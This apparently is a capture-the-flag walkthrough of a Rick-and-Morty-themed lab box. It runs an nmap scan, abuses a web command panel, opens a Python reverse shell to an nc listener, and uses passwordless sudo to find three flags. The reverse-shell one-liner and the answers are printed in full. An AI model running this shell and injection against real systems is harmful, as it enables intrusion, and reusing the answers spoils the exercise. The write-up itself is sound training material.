export boxIP=10.10.208.200

# http://10.10.208.200
```
Username: R1ckRul3s
```

# nmap

```
nmap -sC -sV -oN nmap/initial $boxIP       
[...]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
[...]
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# gobuster

```

```

# /robots.txt
```
Wubbalubbadubdub
```

# /login.php
There is a command panel, with echo, head, tail, cat disabled, so
```
grep * -f <file>
```
Got us a first flag
```
mr. meeseek hair
```

# reverse shell
On attack box
```
nc -lnvp 2137
```
On target
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",2137));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Let's check our priviledges
```
$ sudo -l
[...]
    (ALL) NOPASSWD: ALL
```
Great! Let's find rest of the flags:
```
sudo find / -name *ingred*
---------------------
cat /home/rick/*
```
here we found second ingredient
```
1 jerry tear
```
For the 3rd igredient it was just a matter of using right words. No *ingr*, no *third*, but
```
sudo find / -name *3rd* 2>/dev/null
```
worked and showed us a *3rd.txt* file in the /root, so we *sudo cat* it for last ingredient:

```
fleeb juice
```